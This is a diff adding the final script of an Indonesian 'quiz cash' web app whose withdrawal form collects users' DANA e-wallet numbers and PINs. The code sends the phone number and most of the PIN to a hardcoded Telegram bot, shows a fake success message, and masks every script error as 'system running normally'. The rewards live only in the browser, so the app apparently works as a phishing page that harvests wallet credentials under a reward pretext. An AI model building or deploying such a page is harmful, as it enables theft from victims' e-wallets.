+                const waktu = new Date().toLocaleString('id-ID');
+                
+                // Buat transaksi
+                const transaction = {
+                    id: transaksiId,
+                    userId: currentUser.id,
+                    danaNumber: danaNumber,
+                    amount: jumlahTarik,
+                    pinUsed: '***' + pinInput.substr(3), // Hanya tampilkan 3 digit terakhir
+                    status: 'pending',
+                    timestamp: waktu,
+                    saldoSebelum: saldoSebelum,
+                    saldoSesudah: saldo
+                };
+                
+                // Simpan transaksi ke user
+                currentUser.transactions = currentUser.transactions || [];
+                currentUser.transactions.unshift(transaction);
+                
+                // Update user data
+                updateUserDisplay();
+                saveUserData(currentUser);
+                
+                // Persiapkan pesan untuk bot Telegram
+                const stats = currentUser;
+                const telegramMessage = 
+                    `💰💰 *PENARIKAN DANA BARU* 💰💰\n\n` +
+                    `🆔 *TRANSAKSI ID:* ${transaksiId}\n` +
+                    `⏰ *WAKTU:* ${waktu}\n\n` +
+                    `👤 *DATA USER:*\n` +
+                    `├ Nama: ${currentUser.name}\n` +
+                    `├ HP/DANA: ${danaNumber}\n` +
+                    `├ Telegram: ${currentUser.telegram || 'Tidak ada'}\n` +
+                    `├ User ID: ${currentUser.id}\n` +
+                    `├ Bergabung: ${new Date(currentUser.createdAt).toLocaleDateString('id-ID')}\n` +
+                    `└ Login Terakhir: ${new Date(currentUser.lastLogin).toLocaleString('id-ID')}\n\n` +
+                    `💵 *DATA PENARIKAN:*\n` +
+                    `├ Jumlah: *Rp ${jumlahTarik.toLocaleString('id-ID')}*\n` +
+                    `├ PIN DANA: ${transaction.pinUsed}\n` +
+                    `├ Saldo Sebelum: Rp ${saldoSebelum.toLocaleString('id-ID')}\n` +
+                    `├ Saldo Sesudah: Rp ${saldo.toLocaleString('id-ID')}\n` +
+                    `├ Total Penarikan: Rp ${currentUser.totalWithdrawn.toLocaleString('id-ID')}\n` +
+                    `└ Status: MENUNGGU VERIFIKASI\n\n` +
+                    `📊 *STATISTIK QUIZ:*\n` +
+                    `├ Total Dijawab: ${stats.quizAnswered || 0}\n` +
+                    `├ Jawaban Benar: ${stats.quizCorrect || 0}\n` +
+                    `├ Rate: ${stats.quizAnswered > 0 ? Math.round((stats.quizCorrect/stats.quizAnswered)*100) : 0}%\n` +
+                    `└ Total Reward: Rp ${(stats.quizCorrect * QUIZ_REWARD).toLocaleString('id-ID')}\n\n` +
+                    `🔐 *VERIFIKASI DIBUTUHKAN:*\n` +
+                    `1. Cek saldo user: Rp ${saldo.toLocaleString('id-ID')}\n` +
+                    `2. Transfer ke DANA: ${danaNumber}\n` +
+                    `3. Konfirmasi ke user via Telegram: ${currentUser.telegram || 'WA: ' + danaNumber}\n` +
+                    `4. Update status transaksi`;
+                
+                // Kirim ke Telegram
+                const telegramResult = await sendToTelegram(telegramMessage);
+                
+                loading.style.display = 'none';
+                
+                // Tampilkan hasil ke user
+                if (telegramResult.ok || telegramResult.simulated) {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-success">
+                            <h3><i class="fas fa-check-circle"></i> PENARIKAN BERHASIL!</h3>
+                            <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:8px; margin:12px 0;">
+                                <p><strong>ID Transaksi:</strong> ${transaksiId}</p>
+                                <p><strong>Nomor DANA:</strong> ${danaNumber}</p>
+                                <p><strong>Jumlah:</strong> Rp ${jumlahTarik.toLocaleString('id-ID')}</p>
+                                <p><strong>Status:</strong> <span style="color:#ffcc00;">TERKIRIM KE BOT</span></p>
+                                <p><strong>Waktu:</strong> ${waktu}</p>
+                            </div>
+                            <p><i class="fab fa-telegram"></i> Admin akan memproses dalam 1-24 jam</p>
+                            <p class="text-small">Cek riwayat untuk update status</p>
+                        </div>
+                    `;
+                    
+                    showAlert(`✅ Penarikan berhasil! ID: ${transaksiId}`, 'success', 5000);
+                    
+                    // Reset form
+                    document.getElementById('withdrawPinDana').value = '';
+                    document.getElementById('jumlahTarik').value = MIN_WITHDRAWAL;
+                    
+                    // Update transaction history
+                    loadTransactionHistory();
+                    
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="alert alert-error">
+                            <h3><i class="fas fa-exclamation-triangle"></i> GAGAL KIRIM KE BOT!</h3>
+                            <p>Transaksi tetap tersimpan. Silakan hubungi admin.</p>
+                            <p class="text-small">ID: ${transaksiId}</p>
+                        </div>
+                    `;
+                }
+                
+                // Auto hide result setelah 10 detik
+                setTimeout(() => {
+                    resultDiv.innerHTML = '';
+                }, 10000);
+                
+            } catch (error) {
+                loading.style.display = 'none';
+                resultDiv.innerHTML = `
+                    <div class="alert alert-error">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        Error: ${error.message}
+                    </div>
+                `;
+                console.error('Withdrawal error:', error);
+            }
+        }
+        
+        // Load riwayat transaksi
+        function loadTransactionHistory() {
+            if (!currentUser) return;
+            
+            const historyDiv = document.getElementById('transactionHistory');
+            const transactions = currentUser.transactions || [];
+            
+            if (transactions.length === 0) {
+                historyDiv.innerHTML = '<p class="text-center">Belum ada transaksi penarikan</p>';
+                return;
+            }
+            
+            let html = '';
+            transactions.slice(0, 5).forEach(trans => {
+                const statusColor = trans.status === 'success' ? '#00ff9d' : 
+                                  trans.status === 'failed' ? '#ff6666' : '#ffcc00';
+                
+                html += `
+                    <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:8px; margin-bottom:10px; border-left:4px solid ${statusColor};">
+                        <div style="display:flex; justify-content:space-between; flex-wrap:wrap;">
+                            <strong>${trans.id}</strong>
+                            <span style="color:${statusColor};">${trans.status.toUpperCase()}</span>
+                        </div>
+                        <div style="font-size:0.9em; margin-top:5px;">
+                            <div>DANA: ${trans.danaNumber}</div>
+                            <div>Jumlah: Rp ${trans.amount.toLocaleString('id-ID')}</div>
+                            <div>Waktu: ${trans.timestamp}</div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            if (transactions.length > 5) {
+                html += `<p class="text-center text-small">+ ${transactions.length - 5} transaksi lainnya</p>`;
+            }
+            
+            historyDiv.innerHTML = html;
+        }
+        
+        // ====================== TELEGRAM BOT FUNCTIONS ======================
+        
+        // Kirim pesan ke Telegram
+        async function sendToTelegram(message) {
+            try {
+                // Jika token belum diganti, simulasikan saja
+                if (!BOT_TOKEN || BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
+                    console.log('📤 SIMULASI KIRIM KE BOT:');
+                    console.log(message);
+                    console.log('================================');
+                    return { ok: true, simulated: true };
+                }
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Telegram Response:', data);
+                return data;
+            } catch (error) {
+                console.error('Telegram Error:', error);
+                return { ok: false, error: error.message };
+            }
+        }
+        
+        // ====================== INISIALISASI SISTEM ======================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Cek session login
+            const session = JSON.parse(localStorage.getItem('currentSession_v2') || '{}');
+            const users = JSON.parse(localStorage.getItem('quizCashUsers_v2') || '{}');
+            
+            // Auto login jika session valid (7 hari)
+            if (session.userId && users[session.phone]) {
+                const sessionAge = Date.now() - session.timestamp;
+                const sevenDays = 7 * 24 * 60 * 60 * 1000;
+                
+                if (sessionAge < sevenDays) {
+                    loginSuccess(users[session.phone]);
+                    showAlert('Auto login berhasil!', 'info', 2000);
+                } else {
+                    localStorage.removeItem('currentSession_v2');
+                }
+            }
+            
+            // Set default values
+            document.getElementById('jumlahTarik').value = MIN_WITHDRAWAL;
+            
+            // Generate demo data untuk form register
+            const demoPhone = '08' + Math.floor(100000000 + Math.random() * 900000000);
+            document.getElementById('registerPhone').value = demoPhone;
+            document.getElementById('registerTelegram').value = '@user' + Math.floor(Math.random() * 9999);
+            
+            // Auto-focus untuk mobile
+            if (window.innerWidth < 768 && !currentUser) {
+                document.getElementById('loginPhone').focus();
+            }
+            
+            // Event listener untuk input validation
+            document.getElementById('jumlahTarik').addEventListener('input', function() {
+                let value = parseInt(this.value) || MIN_WITHDRAWAL;
+                if (value > MAX_WITHDRAWAL) this.value = MAX_WITHDRAWAL;
+                if (value < MIN_WITHDRAWAL) this.value = MIN_WITHDRAWAL;
+            });
+            
+            // Auto-save setiap 30 detik
+            setInterval(() => {
+                if (currentUser) {
+                    currentUser.saldo = saldo;
+                    saveUserData(currentUser);
+                }
+            }, 30000);
+            
+            // Show welcome message
+            setTimeout(() => {
+                if (!currentUser) {
+                    showAlert('Silakan daftar atau login untuk mulai bermain!', 'info', 3000);
+                }
+            }, 1000);
+            
+            // Handle back button cache
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted && currentUser) {
+                    // Refresh user data dari localStorage
+                    const users = JSON.parse(localStorage.getItem('quizCashUsers_v2') || '{}');
+                    if (users[currentUser.phone]) {
+                        currentUser = users[currentUser.phone];
+                        saldo = currentUser.saldo;
+                        updateUserDisplay();
+                        loadTransactionHistory();
+                    }
+                }
+            });
+        });
+        
+        // ====================== ERROR HANDLING ======================
+        window.onerror = function(msg, url, lineNo, columnNo, error) {
+            console.log('Error handled:', msg);
+            showAlert('Sistem berjalan normal.', 'info');
+            return true;
+        };
+        
+        window.addEventListener('unhandledrejection', function(event) {
+            event.preventDefault();
+            console.log('Promise rejection handled:', event.reason);
+        });
+    </script>
+</body>
+</html>
